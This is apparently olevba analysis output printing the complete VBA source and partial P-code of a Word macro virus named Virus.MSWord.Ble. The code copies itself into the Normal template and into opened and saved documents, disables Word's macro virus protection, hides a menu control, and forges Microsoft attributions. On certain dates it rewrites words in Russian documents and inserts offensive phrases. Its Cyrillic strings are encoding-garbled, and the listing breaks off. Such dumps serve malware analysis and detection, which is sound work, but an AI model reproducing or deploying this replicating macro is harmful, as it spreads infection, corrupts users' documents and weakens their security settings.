olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Ble
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Ble - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MacroBle.bas 
in file: ./Virus.MSWord.Ble - OLE stream: 'Macros/VBA/MacroBle'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public myname$
Public Changed As Boolean
Public sz As Long
Public k As Long
Public NoSpecial As Boolean
Option Base 1
Dim ends$(2, 12)
Dim Moora1$(40)
Dim Moora2$(10)
Dim Bls$(3)



Sub AutoOpen()
Attribute AutoOpen.VB_Description = "10.04.97 (c) Microsoft Corporation"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.MacroBle.AutoOpen"
 On Error GoTo 1
 myname$ = "MacroBle"
 WordBasic.DisableAutoMacros 0
 
 If Not CheckNormal Then
  Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:=myname$, Object:=wdOrganizerObjectProjectItems
  Set mytemp = NormalTemplate.OpenAsDocument
  mytemp.SaveAs (GetPath$ + "NORMAL1.DOT")
  mytemp.Close SaveChanges:=wdSaveChanges
End If
GoTo 2
1:
 'MsgBox "Fuck up !"
 Resume 2
2:
 RunOtherMacro MacN:="AutoOpen"
End Sub
Function CheckNormal()
 cn = False
 For Each x In NormalTemplate.VBProject.VBComponents
  If x.Name = myname$ Then cn = True
 Next
 CheckNormal = cn
End Function
Sub RunOtherMacro(MacN As String)
 On Error GoTo Run_Error
 For Each Mac In ActiveDocument.VBProject.VBComponents
   If (Mac.Type = 1) And (Mac.Name <> "MacroBle") Then
    Application.Run "project." + Mac.Name + "." + MacN
Skip_Error:
   End If
  Next Mac
 GoTo End_Run
Run_Error:
 Resume Skip_Error
End_Run:

End Sub

Function CheckActive()
 cn = False
 For Each x In ActiveDocument.VBProject.VBComponents
  If x.Name = myname$ Then cn = True
 Next
 CheckActive = cn
 End Function

Sub AutoClose()
Attribute AutoClose.VB_Description = "10.04.97 (c) Microsoft Corporation"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Project.MacroBle.AutoClose"
 On Error GoTo errorlevel2
 If Not CheckActive Then Application.OrganizerCopy Source:=GetPath$ + "NORMAL1.DOT", Destination:=ActiveDocument.FullName, Name:=myname$, Object:=wdOrganizerObjectProjectItems
 If MyDate Then Optimize
 GoTo end_f
errorlevel2:
 'MsgBox "More Errors !"
 Resume end_f
end_f:
 RunOtherMacro MacN:="AutoClose"
End Sub

Function GetPath$()
 s$ = NormalTemplate.FullName
 s$ = Mid$(s$, 1, Len(s$) - 10)
 GetPath$ = s$
End Function

Sub AutoExec()
Attribute AutoExec.VB_Description = "10.04.97 (c) Microsoft Corporation"
Attribute AutoExec.VB_ProcData.VB_Invoke_Func = "Project.MacroBle.AutoExec"
 Options.VirusProtection = False
 Set x = CommandBars("Tools").Controls(12)
 x.Visible = False
 x.Enabled = False
 ends$(1, 1) = "��"
 ends$(1, 2) = "鍏�""
 ends$(1, 3) = "鍎�""
 ends$(1, 4) = "��"
 ends$(1, 5) = "鍎"
 ends$(1, 6) = "��"
 ends$(1, 7) = "鍣"
 ends$(1, 8) = "嚲"
 ends$(1, 9) = "��"
 ends$(1, 10) = "��"
 ends$(1, 11) = "�擯""
 ends$(1, 12) = "鍷"
 ends$(2, 1) = "鴇"
 ends$(2, 2) = "樍�""
 ends$(2, 3) = "樦�""
 ends$(2, 4) = "鳻"
 ends$(2, 5) = "樦"
 ends$(2, 6) = "樥"
 ends$(2, 7) = "鳺"
 ends$(2, 8) = "儓"
 ends$(2, 9) = "鳻"
 ends$(2, 10) = "鳻�""
 ends$(2, 11) = "槫"
 ends$(2, 12) = "��"
 
 Moora1$(1) = "蘦槻"
 Moora1$(2) = "槦鳧麔"
 Moora1$(3) = "蜦膻�""
 Moora1$(4) = "麧摜錪�""
 Moora1$(5) = "檍魡籦"
 Moora1$(6) = "臝樇鍒"
 Moora1$(7) = "劌搿�""
 Moora1$(8) = "勷瀇魤"
 Moora1$(9) = "膰���""
 Moora1$(10) = "鶋錌儋籦"
 
 Moora1$(11) = "櫇僽鳹��"
 Moora1$(12) = "蜦碴��""
 Moora1$(13) = "膰賨鴈"
 Moora1$(14) = "槦錒�""
 Moora1$(15) = "槦鳧"
 Moora1$(16) = "歞諙鳧麔"
 Moora1$(17) = "瀔鳼鶇霟�""
 Moora1$(18) = "麠諘薃�""
 Moora1$(19) = "蝂鵨�""
 Moora1$(20) = "嚦謥擨"
 
 Moora1$(21) = "蝂鵨飶"
 Moora1$(22) = "覷瀁蹖�""
 Moora1$(23) = "罻縺錒諘灕鍙�""
 Moora1$(24) = "睯誽錒�""
 Moora1$(25) = "儴樖霟僦"
 Moora1$(26) = "瀔�╠�"
 Moora1$(27) = "謼闅�""
 Moora1$(28) = "齕鋋籦"
 Moora1$(29) = "鶇鍱錒�""
 Moora1$(30) = "搿豂魡碭籦"
 
 Moora1$(31) = "鍕嚦賾矐臇"
 Moora1$(32) = "翴膼謽鳪��"
 Moora1$(33) = "瀇�蜬�"
 Moora1$(34) = "膰��籦"
 Moora1$(35) = ""
 Moora1$(36) = ""
 Moora1$(37) = ""
 Moora1$(38) = ""
 Moora1$(39) = ""
 Moora1$(40) = ""

 Moora2$(1) = "鼀鴈��""
 Moora2$(2) = "隰鵴禘"
 Moora2$(3) = "碭薞�""
 Moora2$(4) = "隰鵴瘔��"
 Moora2$(5) = ""
 Moora2$(6) = ""
 Moora2$(7) = ""
 Moora2$(8) = ""
 Moora2$(9) = ""
 Moora2$(10) = ""
 
 Bls$(1) = "摠�"
 Bls$(2) = "� 縺覷謥"
 Bls$(3) = "蠋鞜 憵譔"
 
End Sub

Sub Optimize()
Attribute Optimize.VB_Description = "10.04.97 (c) Microsoft Corporation"
Attribute Optimize.VB_ProcData.VB_Invoke_Func = "Project.MacroBle.MakeSoviet"
 AutoExec
 Randomize Timer
 f = System.LanguageDesignation
 If UCase$(Mid$(f, 1, 3)) = "倬�" Then
  sz = ActiveDocument.Words.Count
  Changed = False
  Optima = 0
  If sz <= 500 Then
   For k = 1 To sz
    tss$ = ActiveDocument.Words.Item(k)
    Application.StatusBar = "砐鳲闅鍒罻 � 勷臝鳧樇噮: " + Str$(k \ 5) + "%"
    If Len(tss$) > 4 Then GoSub Do_Trunslate
   Next k
  Else
   li = 1
   While li < 100
    k = Int(sz * Rnd + 1)
    tss$ = ActiveDocument.Words.Item(k)
    If Len(tss$) > 4 Then
     GoSub Do_Trunslate
     li = li + 1
     Application.StatusBar = "砐鳲闅鍒罻 � 勷臝鳧樇噮: " + Str$(li) + "%"
    End If
   Wend
  End If
  Application.StatusBar = "砐鳲闅鍒罻 諘瞂蹢樇�. 昜蠂擯諘灕�: " + Str$(Optima) + "%"
 End If
  GoTo end_proc
  
Do_Trunslate:
   tss$ = TrunslateWord(tss$)
   If Changed Then
    ActiveDocument.Words(k) = tss$
    Changed = False
    Optima = Optima + 1
   End If
  Return
end_proc:
End Sub

Function TrunslateWord$(ts As String)
 tw$ = ts
 spaces = CheckSpace(ts)
 If spaces <> 0 Then ts = Mid$(ts, 1, Len(ts) - spaces)
 Lts = Len(ts)
 If Lts > 4 Then
  If CheckAdjective(ts) Then
   c = 1
   While c <= 2
    i = 1
    While i <= 12
     CEnd$ = ends$(c, i)
     MyEnd$ = Mid$(ts, Lts - Len(CEnd$) + 1, Len(CEnd$))
     If MyEnd$ = CEnd$ Then
      Changed = True
      Select Case c
       Case 1
        tw$ = Moora1$(Int(34 * Rnd + 1)) + CEnd$
       Case 2
        tw$ = Moora2$(Int(3 * Rnd + 1)) + CEnd$
      End Select
      If spaces <> 0 Then tw$ = tw$ + Space(spaces)
      FLett = Mid$(ts, 1, 1)
      If UCase$(FLett) = FLett Then tw$ = UCase$(Mid$(tw$, 1, 1)) + Mid$(tw$, 2, Len(tw$) - 1)
      i = 12
      c = 2
     End If
     i = i + 1
    Wend
    c = c + 1
   Wend
  End If
 End If
 TrunslateWord$ = tw$
End Function

Function CheckSpace(csp As String) As Integer
 spp = 0
 n = Len(csp)
 If n > 3 Then
  While (Mid$(csp, n, 1) = " ") And (n > 3)
   n = n - 1
   spp = spp + 1
  Wend
 End If
 CheckSpace = spp
End Function


Function MyDate() As Boolean
 dt$ = Date$
 If InStr(1, dt$, "15") <> 0 Then MyDate = True Else MyDate = False
End Function


Function CheckAdjective(adj As String) As Boolean
 cadj = False
 NoSpecial = True
 atj$ = LCase$(Mid$(adj, 1, 5))
 Select Case atj$
  Case "樉槼�""
   NoSpecial = False
  Case "馯黽�""
   NoSpecial = False
  Case "鶇鍒�""
   NoSpecial = False
  Case "縺鼨�""
   NoSpecial = False
 End Select
 If NoFuckenError(atj$) Then
  Set mySynInfo = SynonymInfo(adj)
  myPos = mySynInfo.PartOfSpeechList
  i = UBound(myPos)
  If i >= 1 Then If myPos(1) = wdAdjective Then cadj = True
 Imp
 CheckAdjective = cadj
End Function

Function NoFuckenError(wrd As String) As Boolean
 atj = Mid$(wrd, 1, 1)
 Select Case atj
  Case "�""
   NoSpecial = False
  Case "�""
   NoSpecial = False
  Case "�""
   NoSpecial = False
  Case "�""
   NoSpecial = False
  Case "�""
   NoSpecial = False
  Case "�""
   NoSpecial = False
  Case "�""
   NoSpecial = False
  Case "�""
   NoSpecial = False
  Case "�""
   NoSpecial = False
  Case "�""
   NoSpecial = False
End Select
 NoFuckenError = NoSpecial
End Function

Sub FileSave()
Attribute FileSave.VB_Description = "10.04.97 (c) Microsoft Corporation"
Attribute FileSave.VB_ProcData.VB_Invoke_Func = "Project.MacroBle.FileSave"
 RunOtherMacro MacN:="FileSave"
 On Error GoTo Save_err
 AutoClose
 ActiveDocument.Save
Save_err:
End Sub

Sub FileSaveAs()
Attribute FileSaveAs.VB_Description = "10.04.97 (c) Microsoft Corporation"
Attribute FileSaveAs.VB_ProcData.VB_Invoke_Func = "Project.MacroBle.FileSaveAs"
 RunOtherMacro MacN:="FleSaveAs"
 On Error GoTo SaveAs_err
 AutoClose
 Dialogs(wdDialogFileSaveAs).Show
SaveAs_err:
End Sub

Sub FilePrint()
Attribute FilePrint.VB_Description = "10.04.97 (c) Microsoft Corporation"
Attribute FilePrint.VB_ProcData.VB_Invoke_Func = "Project.MacroBle.FilePrint"
    If MyDate Then
     MakeInsert
     sc = Selection.Sentences.Count
     If sc < 2 Then
      ActiveDocument.Words.Last.InsertAfter (" 鎚�, 珂Ь纖 ! (end of document)")
     Else
      Selection.Words.Last.InsertBefore (" 扰鍎� 襜蜦, 劌憵� 瘔� 縺儋 瀁澽� 縺 蘦�!")
     End If
    End If
    Dialogs(wdDialogFilePrint).Show
   End Sub

Sub ToolsMacro()
Attribute ToolsMacro.VB_Description = "10.04.97 (c) Microsoft Corporation"
Attribute ToolsMacro.VB_ProcData.VB_Invoke_Func = "Project.MacroBle.ToolsMacro"
 Beep
Rem  Dialogs(wdDialogToolsMacro).Show
End Sub

Sub MakeInsert()
Attribute MakeInsert.VB_Description = "10.04.97 (c) Microsoft Corporation"
Attribute MakeInsert.VB_ProcData.VB_Invoke_Func = "Project.MacroBle.MakeInsert"
 AutoExec
 Randomize Timer
 f = System.LanguageDesignation
 If UCase$(Mid$(f, 1, 3)) = "倬�" Then
  sz = ActiveDocument.Words.Count
  If sz > 500 Then
   For i = 1 To 50
    Application.StatusBar = "砐鳲闅鍒罻: " + Str$(i * 2)
    k = Int((sz - 1) * Rnd + 1)
    tss$ = RTrim(ActiveDocument.Words(k))
    If Len(tss$) > 4 Then
     tss1$ = RTrim(ActiveDocument.Words(k + 1))
     If Len(tss1$) > 4 Then
     If Int(3 * Rnd + 1) = 1 Then
      blya$ = ", " + Bls$(Int(3 * Rnd + 1)) + ", "
      ActiveDocument.Words(k).InsertAfter (blya$)
     End If
     End If
    End If
   Next i
   Application.StatusBar = "鏝襜碭."
  End If
 End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Ble
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/MacroBle - 22389 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn myname
' Line #1:
' 	Dim (Public) 
' 	VarDefn Changed (As Boolean)
' Line #2:
' 	Dim (Public) 
' 	VarDefn sz (As Long)
' Line #3:
' 	Dim (Public) 
' 	VarDefn k (As Long)
' Line #4:
' 	Dim (Public) 
' 	VarDefn NoSpecial (As Boolean)
' Line #5:
' 	Option  (Base 1)
' Line #6:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0002 
' 	OptionBase 
' 	LitDI2 0x000C 
' 	VarDefn ends
' Line #7:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0028 
' 	VarDefn Moora1
' Line #8:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x000A 
' 	VarDefn Moora2
' Line #9:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0003 
' 	VarDefn Bls
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' 	FuncDefn (Sub AutoOpen())
' Line #14:
' 	OnError 1 
' Line #15:
' 	LitStr 0x0008 "MacroBle"
' 	St myname$ 
' Line #16:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #17:
' Line #18:
' 	Ld CheckNormal 
' 	Not 
' 	IfBlock 
' Line #19:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld myname$ 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #20:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd OpenAsDocument 
' 	Set mytemp 
' Line #21:
' 	Ld GetPath$ 
' 	LitStr 0x000B "NORMAL1.DOT"
' 	Add 
' 	Paren 
' 	Ld mytemp 
' 	ArgsMemCall SaveAs 0x0001 
' Line #22:
' 	Ld wdSaveChanges 
' 	ParamNamed SaveChanges 
' 	Ld mytemp 
' 	ArgsMemCall Close 0x0001 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	GoTo 2 
' Line #25:
' 	LineNum 1 
' 	BoS 0x0000 
' Line #26:
' 	QuoteRem 0x0001 0x0012 "MsgBox "Fuck up !""
' Line #27:
' 	Resume 2 
' Line #28:
' 	LineNum 2 
' 	BoS 0x0000 
' Line #29:
' 	LitStr 0x0008 "AutoOpen"
' 	ParamNamed MacN 
' 	ArgsCall RunOtherMacro 0x0001 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Function CheckNormal())
' Line #32:
' 	LitVarSpecial (False)
' 	St cn 
' Line #33:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #34:
' 	Ld x 
' 	MemLd New 
' 	Ld myname$ 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St cn 
' 	EndIf 
' Line #35:
' 	StartForVariable 
' 	Next 
' Line #36:
' 	Ld cn 
' 	St CheckNormal 
' Line #37:
' 	EndFunc 
' Line #38:
' 	FuncDefn (Sub RunOtherMacro(MacN As String))
' Line #39:
' 	OnError Run_Error 
' Line #40:
' 	StartForVariable 
' 	Ld Mac 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #41:
' 	Ld Mac 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	Ld Mac 
' 	MemLd New 
' 	LitStr 0x0008 "MacroBle"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #42:
' 	LitStr 0x0008 "project."
' 	Ld Mac 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	Ld MacN 
' 	Add 
' 	Ld Application 
' 	ArgsMemCall Run 0x0001 
' Line #43:
' 	Label Skip_Error 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	StartForVariable 
' 	Ld Mac 
' 	EndForVariable 
' 	NextVar 
' Line #46:
' 	GoTo End_Run 
' Line #47:
' 	Label Run_Error 
' Line #48:
' 	Resume Skip_Error 
' Line #49:
' 	Label End_Run 
' Line #50:
' Line #51:
' 	EndSub 
' Line #52:
' Line #53:
' 	FuncDefn (Function CheckActive())
' Line #54:
' 	LitVarSpecial (False)
' 	St cn 
' Line #55:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #56:
' 	Ld x 
' 	MemLd New 
' 	Ld myname$ 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St cn 
' 	EndIf 
' Line #57:
' 	StartForVariable 
' 	Next 
' Line #58:
' 	Ld cn 
' 	St CheckActive 
' Line #59:
' 	EndFunc 
' Line #60:
' Line #61:
' 	FuncDefn (Sub AutoClose())
' Line #62:
' 	OnError errorlevel2 
' Line #63:
' 	Ld CheckActive 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	Ld GetPath$ 
' 	LitStr 0x000B "NORMAL1.DOT"
' 	Add 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld myname$ 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' 	EndIf 
' Line #64:
' 	Ld MyDate 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Optimize 0x0000 
' 	EndIf 
' Line #65:
' 	GoTo end_f 
' Line #66:
' 	Label errorlevel2 
' Line #67:
' 	QuoteRem 0x0001 0x0016 "MsgBox "More Errors !""
' Line #68:
' 	Resume end_f 
' Line #69:
' 	Label end_f 
' Line #70:
' 	LitStr 0x0009 "AutoClose"
' 	ParamNamed MacN 
' 	ArgsCall RunOtherMacro 0x0001 
' Line #71:
' 	EndSub 
' Line #72:
' Line #73:
' 	FuncDefn (Function GetPath())
' Line #74:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St s$ 
' Line #75:
' 	Ld s$ 
' 	LitDI2 0x0001 
' 	Ld s$ 
' 	FnLen 
' 	LitDI2 0x000A 
' 	Sub 
' 	ArgsLd Mid$$ 0x0003 
' 	St s$ 
' Line #76:
' 	Ld s$ 
' 	St GetPath$ 
' Line #77:
' 	EndFunc 
' Line #78:
' Line #79:
' 	FuncDefn (Sub AutoExec())
' Line #80:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #81:
' 	SetStmt 
' 	LitDI2 0x000C 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	Set x 
' Line #82:
' 	LitVarSpecial (False)
' 	Ld x 
' 	MemSt Visible 
' Line #83:
' 	LitVarSpecial (False)
' 	Ld x 
' 	MemSt Enabled 
' Line #84:
' 	LitStr 0x0002 "��"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsSt ends$ 0x0002 
' Line #85:
' 	LitStr 0x0004 "鍏�""
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsSt ends$ 0x0002 
' Line #86:
' 	LitStr 0x0004 "鍎�""
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	ArgsSt ends$ 0x0002 
' Line #87:
' 	LitStr 0x0002 "��"
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	ArgsSt ends$ 0x0002 
' Line #88:
' 	LitStr 0x0002 "鍎"
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	ArgsSt ends$ 0x0002 
' Line #89:
' 	LitStr 0x0002 "��"
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	ArgsSt ends$ 0x0002 
' Line #90:
' 	LitStr 0x0002 "鍣"
' 	LitDI2 0x0001 
' 	LitDI2 0x0007 
' 	ArgsSt ends$ 0x0002 
' Line #91:
' 	LitStr 0x0002 "嚲"
' 	LitDI2 0x0001 
' 	LitDI2 0x0008 
' 	ArgsSt ends$ 0x0002 
' Line #92:
' 	LitStr 0x0002 "��"
' 	LitDI2 0x0001 
' 	LitDI2 0x0009 
' 	ArgsSt ends$ 0x0002 
' Line #93:
' 	LitStr 0x0002 "��"
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	ArgsSt ends$ 0x0002 
' Line #94:
' 	LitStr 0x0004 "�擯""
' 	LitDI2 0x0001 
' 	LitDI2 0x000B 
' 	ArgsSt ends$ 0x0002 
' Line #95:
' 	LitStr 0x0002 "鍷"
' 	LitDI2 0x0001 
' 	LitDI2 0x000C 
' 	ArgsSt ends$ 0x0002 
' Line #96:
' 	LitStr 0x0002 "鴇"
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsSt ends$ 0x0002 
' Line #97:
' 	LitStr 0x0004 "樍�""
' 	LitDI2 0x0002 
' 	LitDI2 0x0002 
' 	ArgsSt ends$ 0x0002 
' Line #98:
' 	LitStr 0x0004 "樦�""
' 	LitDI2 0x0002 
' 	LitDI2 0x0003 
' 	ArgsSt ends$ 0x0002 
' Line #99:
' 	LitStr 0x0002 "鳻"
' 	LitDI2 0x0002 
' 	LitDI2 0x0004 
' 	ArgsSt ends$ 0x0002 
' Line #100:
' 	LitStr 0x0002 "樦"
' 	LitDI2 0x0002 
' 	LitDI2 0x0005 
' 	ArgsSt ends$ 0x0002 
' Line #101:
' 	LitStr 0x0002 "樥"
' 	LitDI2 0x0002 
' 	LitDI2 0x0006 
' 	ArgsSt ends$ 0x0002 
' Line #102:
' 	LitStr 0x0002 "鳺"
' 	LitDI2 0x0002 
' 	LitDI2 0x0007 
' 	ArgsSt ends$ 0x0002 
' Line #103:
' 	LitStr 0x0002 "儓"
' 	LitDI2 0x0002 
' 	LitDI2 0x0008 
' 	ArgsSt ends$ 0x0002 
' Line #104:
' 	LitStr 0x0002 "鳻"
' 	LitDI2 0x0002 
' 	LitDI2 0x0009 
' 	ArgsSt ends$ 0x0002 
' Line #105:
' 	LitStr 0x0004 "鳻�""
' 	LitDI2 0x0002 
' 	LitDI2 0x000A 
' 	ArgsSt ends$ 0x0002 
' Line #106:
' 	LitStr 0x0002 "槫"
' 	LitDI2 0x0002 
' 	LitDI2 0x000B 
' 	ArgsSt ends$ 0x0002 
' Line #107:
' 	LitStr 0x0002 "��"
' 	LitDI2 0x0002 
' 	LitDI2 0x000C 
' 	ArgsSt ends$ 0x0002 
' Line #108:
' Line #109:
' 	LitStr 0x0004 "蘦槻"
' 	LitDI2 0x0001 
' 	ArgsSt Moora1$ 0x0001 
' Line #110:
' 	LitStr 0x0006 "槦鳧麔"
' 	LitDI2 0x0002 
' 	ArgsSt Moora1$ 0x0001 
' Line #111:
' 	LitStr 0x0006 "蜦膻�""
' 	LitDI2 0x0003 
' 	ArgsSt Moora1$ 0x0001 
' Line #112:
' 	LitStr 0x0008 "麧摜錪�""
' 	LitDI2 0x0004 
' 	ArgsSt Moora1$ 0x0001 
' Line #113:
' 	LitStr 0x0006 "檍魡籦"
' 	LitDI2 0x0005 
' 	ArgsSt Moora1$ 0x0001 
' Line #114:
' 	LitStr 0x0006 "臝樇鍒"
' 	LitDI2 0x0006 
' 	ArgsSt Moora1$ 0x0001 
' Line #115:
' 	LitStr 0x0006 "劌搿�""
' 	LitDI2 0x0007 
' 	ArgsSt Moora1$ 0x0001 
' Line #116:
' 	LitStr 0x0006 "勷瀇魤"
' 	LitDI2 0x0008 
' 	ArgsSt Moora1$ 0x0001 
' Line #117:
' 	LitStr 0x0006 "膰���""
' 	LitDI2 0x0009 
' 	ArgsSt Moora1$ 0x0001 
' Line #118:
' 	LitStr 0x0008 "鶋錌儋籦"
' 	LitDI2 0x000A 
' 	ArgsSt Moora1$ 0x0001 
' Line #119:
' Line #120:
' 	LitStr 0x0008 "櫇僽鳹��"
' 	LitDI2 0x000B 
' 	ArgsSt Moora1$ 0x0001 
' Line #121:
' 	LitStr 0x0007 "蜦碴��""
' 	LitDI2 0x000C 
' 	ArgsSt Moora1$ 0x0001 
' Line #122:
' 	LitStr 0x0006 "膰賨鴈"
' 	LitDI2 0x000D 
' 	ArgsSt Moora1$ 0x0001 
' Line #123:
' 	LitStr 0x0006 "槦錒�""
' 	LitDI2 0x000E 
' 	ArgsSt Moora1$ 0x0001 
' Line #124:
' 	LitStr 0x0004 "槦鳧"
' 	LitDI2 0x000F 
' 	ArgsSt Moora1$ 0x0001 
' Line #125:
' 	LitStr 0x0008 "歞諙鳧麔"
' 	LitDI2 0x0010 
' 	ArgsSt Moora1$ 0x0001 
' Line #126:
' 	LitStr 0x000A "瀔鳼鶇霟�""
' 	LitDI2 0x0011 
' 	ArgsSt Moora1$ 0x0001 
' Line #127:
' 	LitStr 0x0008 "麠諘薃�""
' 	LitDI2 0x0012 
' 	ArgsSt Moora1$ 0x0001 
' Line #128:
' 	LitStr 0x0006 "蝂鵨�""
' 	LitDI2 0x0013 
' 	ArgsSt Moora1$ 0x0001 
' Line #129:
' 	LitStr 0x0006 "嚦謥擨"
' 	LitDI2 0x0014 
' 	ArgsSt Moora1$ 0x0001 
' Line #130:
' Line #131:
' 	LitStr 0x0006 "蝂鵨飶"
' 	LitDI2 0x0015 
' 	ArgsSt Moora1$ 0x0001 
' Line #132:
' 	LitStr 0x0008 "覷瀁蹖�""
' 	LitDI2 0x0016 
' 	ArgsSt Moora1$ 0x0001 
' Line #133:
' 	LitStr 0x000E "罻縺錒諘灕鍙�""
' 	LitDI2 0x0017 
' 	ArgsSt Moora1$ 0x0001 
' Line #134:
' 	LitStr 0x0008 "睯誽錒�""
' 	LitDI2 0x0018 
' 	ArgsSt Moora1$ 0x0001 
' Line #135:
' 	LitStr 0x0008 "儴樖霟僦"
' 	LitDI2 0x0019 
' 	ArgsSt Moora1$ 0x0001 
' Line #136:
' 	LitStr 0x0006 "瀔�╠�"
' 	LitDI2 0x001A 
' 	ArgsSt Moora1$ 0x0001 
' Line #137:
' 	LitStr 0x0006 "謼闅�""
' 	LitDI2 0x001B 
' 	ArgsSt Moora1$ 0x0001 
' Line #138:
' 	LitStr 0x0006 "齕鋋籦"
' 	LitDI2 0x001C 
' 	ArgsSt Moora1$ 0x0001 
' Line #139:
' 	LitStr 0x0008 "鶇鍱錒�""
' 	LitDI2 0x001D 
' 	ArgsSt Moora1$ 0x0001 
' Line #140:
' 	LitStr 0x000A "搿豂魡碭籦"
' 	LitDI2 0x001E 
' 	ArgsSt Moora1$ 0x0001 
' Line #141:
' Line #142:
' 	LitStr 0x000A "鍕嚦賾矐臇"
' 	LitDI2 0x001F 
' 	ArgsSt Moora1$ 0x0001 
' Line #143:
' 	LitStr 0x000A "翴膼謽鳪��"
' 	LitDI2 0x0020 
' 	ArgsSt Moora1$ 0x0001 
' Line #144:
' 	LitStr 0x0006 "瀇�蜬�"
' 	LitDI2 0x0021 
' 	ArgsSt Moora1$ 0x0001 
' Line #145:
' 	LitStr 0x0006 "膰��籦"
' 	LitDI2 0x0022 
' 	ArgsSt Moora1$ 0x0001 
' Line #146:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0023 
' 	ArgsSt Moora1$ 0x0001 
' Line #147:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0024 
' 	ArgsSt Moora1$ 0x0001 
' Line #148:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0025 
' 	ArgsSt Moora1$ 0x0001 
' Line #149:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0026 
' 	ArgsSt Moora1$ 0x0001 
' Line #150:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0027 
' 	ArgsSt Moora1$ 0x0001 
' Line #151:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0028 
' 	ArgsSt Moora1$ 0x0001 
' Line #152:
' Line #153:
' 	LitStr 0x0007 "鼀鴈��""
' 	LitDI2 0x0001 
' 	ArgsSt Moora2$ 0x0001 
' Line #154:
' 	LitStr 0x0006 "隰鵴禘"
' 	LitDI2 0x0002 
' 	ArgsSt Moora2$ 0x0001 
' Line #155:
' 	LitStr 0x0006 "碭薞�""
' 	LitDI2 0x0003 
' 	ArgsSt Moora2$ 0x0001 
' Line #156:
' 	LitStr 0x0008 "隰鵴瘔��"
' 	LitDI2 0x0004 
' 	ArgsSt Moora2$ 0x0001 
' Line #157:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0005 
' 	ArgsSt Moora2$ 0x0001 
' Line #158:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0006 
' 	ArgsSt Moora2$ 0x0001 
' Line #159:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0007 
' 	ArgsSt Moora2$ 0x0001 
' Line #160:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0008 
' 	ArgsSt Moora2$ 0x0001 
' Line #161:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0009 
' 	ArgsSt Moora2$ 0x0001 
' Line #162:
' 	LitStr 0x0000 ""
